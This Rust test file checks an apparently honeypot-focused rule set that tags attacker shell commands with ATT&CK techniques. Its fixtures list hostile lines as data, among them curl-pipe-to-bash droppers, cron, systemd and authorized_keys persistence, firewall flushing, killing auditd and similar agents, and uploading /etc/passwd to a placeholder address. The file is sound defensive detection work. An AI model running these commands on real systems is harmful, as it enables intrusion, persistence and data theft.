//! The rules against positive and negative lines. Every rule has lines it must match and lines
//! that look like it and must not: the technique's word as an argument or inside a URL, a read
//! where the rule needs a write, a listing where it needs an install. Addresses are RFC 5737.

use std::collections::BTreeSet;

use super::*;
use crate::ioc;

/// The ids of the rules that match `sample`, read as the evidence the rule's scope names.
fn fired(scope: Scope, sample: &str) -> Vec<&'static str> {
    let matches = match scope {
        Scope::Command => tag_command(sample),
        Scope::Download => tag_download(Some(sample), None),
        Scope::Upload => tag_upload(sample),
        Scope::Signal => tag_signal(sample),
        Scope::Indicator => tag_indicators(&ioc::extract_from_command(sample)),
    };
    matches.into_iter().map(|m| m.rule).collect()
}

const SHA: &str = "ab12ab12ab12ab12ab12ab12ab12ab12ab12ab12ab12ab12ab12ab12ab12ab12";

/// `(rule, lines the rule must match)`.
const POSITIVE: &[(&str, &[&str])] = &[
    ("brute-force-signal", &["ssh_brute_force"]),
    ("download-event", &["http://198.51.100.7/bins/x86"]),
    (
        "download-command",
        &[
            "wget http://198.51.100.7/x",
            "busybox wget http://198.51.100.7/x -O /tmp/x",
            "cd /tmp; curl -s http://198.51.100.7/a",
            "curl -sL https://203.0.113.5/a.sh | bash",
            "tftp -g -r x86 198.51.100.7",
            "ftpget -v -u a -p b 198.51.100.7 f f",
            "sudo wget http://198.51.100.7/x",
        ],
    ),
    ("upload-sample", &[SHA]),
    (
        "unix-shell",
        &[
            "sh",
            "sh -c 'ls'",
            "wget -O- http://198.51.100.7/x | sh",
            "busybox sh",
            "bash x.sh",
            "/bin/bash -c id",
        ],
    ),
    (
        "cron-install",
        &[
            "crontab -",
            "(crontab -l; echo '@reboot /tmp/x') | crontab -",
            "echo '* * * * * /tmp/x' >> /etc/crontab",
            "echo x > /etc/cron.d/job",
            "cp x /etc/cron.hourly/x",
            "tee -a /var/spool/cron/root",
            "crontab mycron",
            "crontab -u root file",
            "sh -c \"echo '@daily /tmp/x' >> /etc/crontab\"",
        ],
    ),
    (
        "systemd-unit",
        &[
            "echo '[Service]' > /etc/systemd/system/x.service",
            "cp x.service /usr/lib/systemd/system/x.service",
            "systemctl enable x.service",
            "systemctl --user enable foo",
            "printf '[Service]' > ~/.config/systemd/user/w.service",
        ],
    ),
    (
        "rc-script",
        &[
            "echo '/tmp/x &' >> /etc/rc.local",
            "sed -i 's/exit 0/\\/tmp\\/x/' /etc/rc.local",
            "cp x /etc/rc.d/rc.local",
            "tee /etc/rc.common",
            "echo x > /etc/rc.local.d/local.sh",
        ],
    ),
    (
        "authorized-keys",
        &[
            "echo ssh-rsa AAAA >> ~/.ssh/authorized_keys",
            "cat k >> /root/.ssh/authorized_keys",
            "cp k /home/u/.ssh/authorized_keys",
            "tee -a .ssh/authorized_keys",
            "echo k > .ssh/authorized_keys2",
            "dd if=k of=/root/.ssh/authorized_keys",
        ],
    ),
    (
        "system-info",
        &[
            "uname -a",
            "nproc",
            "lscpu",
            "cat /proc/cpuinfo",
            "cat /proc/cpuinfo | grep name | wc -l",
            "grep -c processor /proc/cpuinfo",
            "head -n1 /etc/os-release",
            "cat < /proc/meminfo",
            "echo $(uname -m)",
        ],
    ),
    (
        "file-discovery",
        &[
            "ls",
            "ls -la /tmp",
            "find / -name x",
            "/bin/ls",
            "cd /tmp; ls",
        ],
    ),
    (
        "process-discovery",
        &[
            "ps",
            "ps aux | grep x",
            "top -bn1",
            "pidof sshd",
            "busybox ps",
        ],
    ),
    (
        "permissions",
        &[
            "chmod 777 x",
            "chmod +x /tmp/x",
            "chown root x",
            "chmod -R 755 /tmp/d",
        ],
    ),
    (
        "file-deletion",
        &["rm -rf /tmp/x", "rm x", "unlink /tmp/a", "shred -u f"],
    ),
    (
        "miner-script",
        &["wget https://coinhive.com/lib/coinhive.min.js"],
    ),
    (
        "miner-configured",
        &["echo 'CoinHive.Anonymous(\"fixture-key\")'"],
    ),
    (
        "firewall-disable",
        &[
            "iptables -F",
            "iptables -t nat -F",
            "ip6tables --flush",
            "nft flush ruleset",
            "ufw disable",
            "systemctl stop firewalld",
            "service iptables stop",
            "/etc/init.d/iptables stop",
            "systemctl disable --now ufw.service",
        ],
    ),
    (
        "security-tool-kill",
        &[
            "pkill auditd",
            "killall -9 aegis",
            "pkill -f AliYunDun",
            "systemctl stop auditd",
            "service cloudmonitor stop",
            "systemctl disable --now fail2ban",
            "/etc/init.d/aegis stop",
        ],
    ),
];

/// `(rule, lines that look like the rule and must not match it)`.
const NEGATIVE: &[(&str, &[&str])] = &[
    (
        "brute-force-signal",
        &[
            "honeypot_login_attempt",
            "remote_auth_failure",
            "ssh_brute_forcer",
        ],
    ),
    ("download-event", &[""]),
    (
        "download-command",
        &[
            "echo wget http://198.51.100.7/x",
            "curl --upload-file /etc/passwd http://198.51.100.7/",
            "curl -d @/etc/passwd http://198.51.100.7/",
            "wget",
            "curl localhost",
            "tftp 198.51.100.7",
            "ftpget",
            "ftpget -v",
            "ls wget.sh",
            "cat curl http://198.51.100.7/x",
        ],
    ),
    ("upload-sample", &[]),
    (
        "unix-shell",
        &[
            "echo sh",
            "ls /bin/sh",
            "wget http://198.51.100.7/sh",
            "cat bash",
            "echo bash -c id",
            "shred x",
        ],
    ),
    (
        "cron-install",
        &[
            "echo crontab",
            "crontab -l",
            "crontab -r",
            "crontab -e",
            // A listing, removal or edit flag wins over a stray operand.
            "crontab -l mycron",
            "crontab -r -",
            "crontab -u root -l",
            "crontab",
            "cat /etc/crontab",
            "ls /etc/cron.d",
            "wget http://198.51.100.7/cron/crontab.sh",
            "echo hi > /tmp/cron.d/x",
            "grep cron /etc/crontab",
            "echo /etc/crontab",
            "cd /etc/cron.d",
            "echo '/etc/cron.d/x'",
        ],
    ),
    (
        "systemd-unit",
        &[
            "systemctl status x",
            "systemctl start x",
            "systemctl enable",
            "cat /etc/systemd/system/x.service",
            "echo systemctl enable x",
            "echo x > /etc/systemd/system/x.conf",
            "echo x > /etc/systemd/system/backup.timer",
            "echo x > /tmp/x.service",
            "echo x > /etc/systemd/system/.service",
        ],
    ),
    (
        "rc-script",
        &[
            "cat /etc/rc.local",
            "ls /etc/init.d",
            "echo x >> /etc/init.d/foo",
            "echo x > /tmp/rc.local",
            "echo rc.local",
            "grep exit /etc/rc.local",
            "sed 's/exit 0/x/' /etc/rc.local",
            "sed -n p /etc/rc.local",
            "dd if=/etc/rc.local of=/tmp/a",
            "echo x > /home/u/rc.local",
        ],
    ),
    (
        "authorized-keys",
        &[
            "cat ~/.ssh/authorized_keys",
            "ls .ssh/authorized_keys",
            "grep x /root/.ssh/authorized_keys",
            "echo authorized_keys",
            "echo k > /tmp/authorized_keys.bak",
            "cp ~/.ssh/authorized_keys /tmp/a",
            "wget http://198.51.100.7/authorized_keys",
        ],
    ),
    (
        "system-info",
        &[
            "echo uname",
            "echo /proc/cpuinfo",
            "ls /proc/cpuinfo",
            "cat /proc/net/dev",
            "wget http://198.51.100.7/uname",
            "cat uname",
            "echo x > /proc/cpuinfo",
        ],
    ),
    (
        "file-discovery",
        &[
            "echo ls",
            "wget http://198.51.100.7/ls",
            "cat ls",
            "cd /tmp/ls",
            "echo 'find / -name x'",
        ],
    ),
    (
        "process-discovery",
        &[
            "echo ps",
            "cat /tmp/ps",
            "wget http://198.51.100.7/ps.sh",
            "cd /proc/top",
        ],
    ),
    (
        "permissions",
        &[
            "chmod",
            "chmod -x",
            "echo chmod +x f",
            "ls chmod",
            "wget http://198.51.100.7/chmod",
            "cat chown",
        ],
    ),
    (
        "file-deletion",
        &[
            "rm",
            "rm -rf",
            "echo rm -rf /",
            "ls rm",
            "wget http://198.51.100.7/rm",
            "cat unlink",
        ],
    ),
    (
        "miner-script",
        &[
            "wget https://example.com/lib/coinhive.min.js",
            "wget https://evilcoinhive.com/lib/x.js",
            "echo coinhive.com",
        ],
    ),
    (
        "miner-configured",
        &[
            "echo CoinHive.Anonymous",
            "echo CoinHive.Other(1)",
            // Another credentials indicator is not a configured miner.
            "wget http://user:pw@198.51.100.7/x",
        ],
    ),
    (
        "firewall-disable",
        &[
            "iptables -L",
            "iptables -A INPUT -j ACCEPT",
            "echo iptables -F",
            "systemctl status firewalld",
            "systemctl stop nginx",
            "service ufw status",
            "ufw enable",
            "nft list ruleset",
            "wget http://198.51.100.7/iptables-F",
        ],
    ),
    (
        "security-tool-kill",
        &[
            "pkill sshd",
            "killall nginx",
            "echo pkill auditd",
            "systemctl status auditd",
            "ps | grep aegis",
            "cat /usr/local/aegis",
            "service nginx stop",
        ],
    ),
];

fn scope_of(rule: &str) -> Scope {
    super::rule(rule).expect("rule in the table").scope
}

#[test]
fn every_rule_matches_its_positive_lines_with_the_right_technique() {
    for (rule_id, lines) in POSITIVE {
        let scope = scope_of(rule_id);
        assert!(!lines.is_empty(), "{rule_id} has no positive line");
        for line in *lines {
            assert!(
                fired(scope, line).contains(rule_id),
                "{rule_id} should match {line:?}, got {:?}",
                fired(scope, line)
            );
        }
    }
}

#[test]
fn no_rule_matches_the_lines_that_only_resemble_it() {
    for (rule_id, lines) in NEGATIVE {
        let scope = scope_of(rule_id);
        for line in *lines {
            assert!(
                !fired(scope, line).contains(rule_id),
                "{rule_id} must not match {line:?}"
            );
        }
    }
}

#[test]
fn the_fixtures_cover_exactly_the_rule_table() {
    let table: BTreeSet<&str> = RULES.iter().map(|r| r.id).collect();
    let positive: BTreeSet<&str> = POSITIVE.iter().map(|(r, _)| *r).collect();
    let negative: BTreeSet<&str> = NEGATIVE.iter().map(|(r, _)| *r).collect();
    assert_eq!(table.len(), RULES.len(), "rule ids are unique");
    assert_eq!(positive, table);
    assert_eq!(negative, table);
}

#[test]
fn every_rule_names_a_well_formed_technique() {
    for r in &RULES {
        let (id, sub) = match r.technique.split_once('.') {
            Some((i, s)) => (i, Some(s)),
            None => (r.technique, None),
        };
        assert!(
            id.len() == 5 && id.starts_with('T') && id[1..].bytes().all(|b| b.is_ascii_digit())
        );
        assert!(sub.is_none_or(|s| s.len() == 3 && s.bytes().all(|b| b.is_ascii_digit())));
        assert!(!r.technique_name.is_empty() && !r.condition.is_empty());
    }
}

#[test]
fn a_token_is_the_evidence_that_matched_not_the_line() {
    let m = tag_command("cd /tmp; wget http://198.51.100.7/x; chmod +x x; rm -f x");
    let token = |rule: &str| {
        m.iter()
            .find(|m| m.rule == rule)
            .map(|m| m.matched.as_str())
    };
    assert_eq!(token("download-command"), Some("http://198.51.100.7/x"));
    assert_eq!(token("permissions"), Some("chmod +x"));
    assert_eq!(token("file-deletion"), Some("rm x"));
    assert_eq!(token("file-discovery"), None);
    let cron = tag_command("echo '* * * * * /tmp/x' >> /etc/crontab");
    assert_eq!(
        cron.iter()
            .map(|m| (m.rule, m.matched.as_str()))
            .collect::<Vec<_>>(),
        [("cron-install", "/etc/crontab")]
    );
    assert_eq!(
        tag_download(None, Some("wget http://198.51.100.7/x"))
            .first()
            .map(|m| m.matched.as_str()),
        Some("wget")
    );
}

#[test]
fn a_dropper_chain_is_tagged_by_what_it_runs_and_not_by_what_it_names() {
    let ids = |line: &str| -> BTreeSet<&'static str> {
        tag_command(line).into_iter().map(|m| m.rule).collect()
    };
    assert_eq!(
        ids(
            "cd /tmp; wget http://198.51.100.7/cron.sh; chmod +x cron.sh; ./cron.sh; rm -f cron.sh"
        ),
        BTreeSet::from(["download-command", "permissions", "file-deletion"])
    );
    assert_eq!(
        ids("echo crontab uname rm chmod wget http://198.51.100.7/x"),
        BTreeSet::new()
    );
    assert_eq!(
        ids("sh -c 'uname -a; ps'"),
        BTreeSet::from(["unix-shell", "system-info", "process-discovery"])
    );
}

#[test]
fn credentials_in_a_matched_url_are_redacted() {
    let m = tag_command("wget http://admin:hunter2@198.51.100.7/x");
    let url = m.iter().find(|m| m.rule == "download-command").unwrap();
    assert!(!url.matched.contains("hunter2"), "{url:?}");
    let d = tag_download(Some("http://admin:hunter2@198.51.100.7/x"), None);
    assert!(!d[0].matched.contains("hunter2"), "{d:?}");
}

/// `docs/reference/attack-tagging.md` owns the human-readable rule list: one row per rule id, each
/// naming the rule's technique id, and the matrix version it states is the one in code.
#[test]
fn the_reference_page_lists_exactly_the_rule_table() {
    let path = std::path::Path::new(env!("CARGO_MANIFEST_DIR"))
        .join("../../docs/reference/attack-tagging.md");
    let doc = std::fs::read_to_string(path).expect("reference page");
    let mut rows: Vec<(String, String)> = Vec::new();
    let rules = doc
        .split("\n## Rules\n")
        .nth(1)
        .and_then(|s| s.split("\n## ").next())
        .expect("a Rules section");
    for line in rules.lines().filter(|l| l.starts_with("| `")) {
        let cells: Vec<&str> = line.split('|').map(str::trim).collect();
        let id = cells[1].trim_matches('`').to_string();
        let technique = cells[2]
            .split_whitespace()
            .next()
            .unwrap_or_default()
            .to_string();
        rows.push((id, technique));
    }
    let table: Vec<(String, String)> = RULES
        .iter()
        .map(|r| (r.id.to_string(), r.technique.to_string()))
        .collect();
    assert_eq!(rows, table);
    assert!(
        doc.contains(&format!("**{MATRIX_VERSION}**")),
        "the page names the matrix version"
    );
}

#[test]
fn a_matched_token_is_bounded_and_one_line() {
    let long = format!("wget http://198.51.100.7/{}\nx", "a".repeat(2000));
    for m in tag_command(&long) {
        assert!(m.matched.len() <= MAX_MATCHED_BYTES && !m.matched.contains('\n'));
    }
}
